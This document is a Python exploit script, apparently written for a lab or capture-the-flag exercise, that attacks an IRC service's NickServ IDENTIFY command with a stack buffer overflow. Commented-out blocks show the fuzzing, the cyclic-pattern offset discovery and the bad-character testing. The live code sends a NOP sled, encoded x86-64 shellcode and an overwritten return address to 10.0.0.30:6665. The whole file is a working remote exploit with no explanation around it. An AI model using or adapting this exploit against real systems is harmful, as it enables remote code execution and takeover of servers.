from time import sleep
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('10.0.0.30', 6665))
s.recv(1024)
s.recv(1024)
s.sendall("hacker")
#for i in range(100, 100000, 100):
#	string = 'A'*i
#	s.sendall('/msg NickServ IDENTIFY hacker '+string+' mail' )
#	print(i)
#	s.recv(1024)
#	sleep(1)

#string = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2A'
#s.sendall('/msg NickServ IDENTIFY hacker '+string+' mail' )
#s.recv(1024)

#hex_string=''
#for i in range(0, 0x100):
#	if(i not in [0x00, 0x20, 0x0A, 0x0D]):
#		hex_string += format(i, '#04x')[2:]
#ascii_string = hex_string.decode("hex")
#string = ascii_string + 'A'*(664 - len(ascii_string)) + 'BBBB\xff\xff\xff\xff'
#s.sendall('/msg NickServ IDENTIFY hacker '+string+' mail' )
#s.recv(1024)


#0x7ffff7d9ffc8
rip = "4242ffffffffffff".decode("hex")
rip = "c8ffd9f7ff7f".decode("hex")
buf =  b"\x90"*64
buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05"
buf += b"\xef\xff\xff\xff\x48\xbb\x88\x8d\x46\x3a\x7d\xde\xbe"
buf += b"\x43\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += b"\xe2\xa4\x1e\xa3\x17\xdc\xe1\x29\x89\xd3\x49\x3f\x35"
buf += b"\x49\xf6\xfa\x8a\x8d\x44\xa0\x77\xde\xbe\x5c\xd9\xc5"
buf += b"\xcf\xdc\x17\xce\xe4\x29\xa2\xd5\x49\x3f\x17\xdd\xe0"
buf += b"\x0b\x77\x43\x2c\x1b\x25\xd1\xbb\x36\x7e\xe7\x7d\x62"
buf += b"\xe4\x96\x05\x6c\xea\xe4\x28\x15\x0e\xb6\xbe\x10\xc0"
buf += b"\x04\xa1\x68\x2a\x96\x37\xa5\x87\x88\x46\x3a\x7d\xde"
buf += b"\xbe\x43"
string = buf + 'A'*(664-len(buf))+ rip
s.sendall('/msg NickServ IDENTIFY hacker '+string+' mail' )
s.recv(1024)

s.close()
	
